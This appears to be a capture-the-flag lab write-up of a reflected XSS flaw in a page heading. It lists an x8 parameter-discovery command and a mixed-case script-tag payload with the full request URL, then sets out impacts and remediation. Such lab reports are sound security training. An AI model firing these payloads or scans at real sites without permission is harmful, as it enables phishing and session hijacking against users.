## Title

Reflected XSS - Page Heading

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the **Reflected XSS - Page Heading (Lab 39)** challenge on KrazePlanetLabs.

During testing, GET parameter discovery was performed using X8 to identify parameters reflected by the application. The scan identified three reflected parameters: `fname`, `lname`, and `q`.

Further testing of the discovered `q` parameter revealed that specially crafted mixed-case script-tag input could execute JavaScript in the browser.

The supplied input is reflected in the page heading, and successful JavaScript execution was confirmed through a browser alert displaying `1`.

**Affected URL:** https://docs.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `q`

## Steps to Reproduce

1. Open the KrazePlanetLabs **Reflected XSS - Page Heading (Lab 39)** challenge.
2. Identify the target address: `https://docs.pwnedbox.site/`.
3. Perform GET parameter discovery using X8 with the following command:

   ```bash
   x8 -u https://docs.pwnedbox.site -X GET --disable-progress-bar --reflected-only -w params.txt
   ```

4. Observe the X8 output, which identifies the following reflected parameters:

   ```text
   reflects: fname
   reflects: lname
   reflects: q
   ```

5. Select the discovered `q` parameter for further testing.
6. Submit the following specially crafted payload through the `q` parameter:

   ```html
   "mihir%27"><> <ScriPT>alert(1)</ScriPT>
   ```

7. Open the resulting URL in the browser.
8. Observe that the supplied input is reflected in the page heading.
9. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.
10. Dismiss the alert and observe the resulting page.

## POC (Proof of Concept)

**Lab Address:** https://docs.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `q`

**Parameter Discovery Command:**

```bash
x8 -u https://docs.pwnedbox.site -X GET --disable-progress-bar --reflected-only -w params.txt
```

**Discovered Reflected Parameters:**

```text
fname
lname
q
```

**XSS Payload:**

```html
"mihir%27"><> <ScriPT>alert(1)</ScriPT>
```

**Request URL:**

```text
https://docs.pwnedbox.site/?q="mihir%27"><> <ScriPT>alert(1)</ScriPT>
```

**Observed Result:**

The application reflects the supplied input in the page heading. The injected JavaScript executes successfully, displaying a browser alert dialog containing `1`. This confirms Reflected XSS through the `q` parameter.

**Screenshot:**
<img width="1503" height="348" alt="image" src="https://github.com/user-attachments/assets/072e5f8c-5981-4549-bd33-f77d04034e8a" />
<img width="1919" height="999" alt="image" src="https://github.com/user-attachments/assets/b53fe060-95c4-4155-a992-60a849c6342b" />
<img width="1919" height="991" alt="image" src="https://github.com/user-attachments/assets/d219a7ed-6403-45d4-90d1-a4496a01da97" />
<img width="1919" height="975" alt="image" src="https://github.com/user-attachments/assets/10c86131-9a8a-49e1-b095-44c909321279" />


## Impact

An attacker could potentially craft a malicious URL containing an XSS payload and convince a victim to open it.

Successful exploitation could result in:

- Execution of arbitrary JavaScript in the victim's browser.
- Phishing attacks through manipulated page content.
- Unauthorized modification of displayed application content.
- Potential unauthorized actions within the victim's authenticated session, depending on application security protections.

## Remediation

1. Implement context-aware output encoding for all user-controlled input before rendering it in HTML.
2. Avoid unsafe DOM manipulation methods such as `innerHTML` when handling untrusted input.
3. Implement appropriate server-side input validation and sanitization as an additional security measure.
4. Configure a restrictive Content Security Policy (CSP) to reduce the risk of unauthorized script execution.
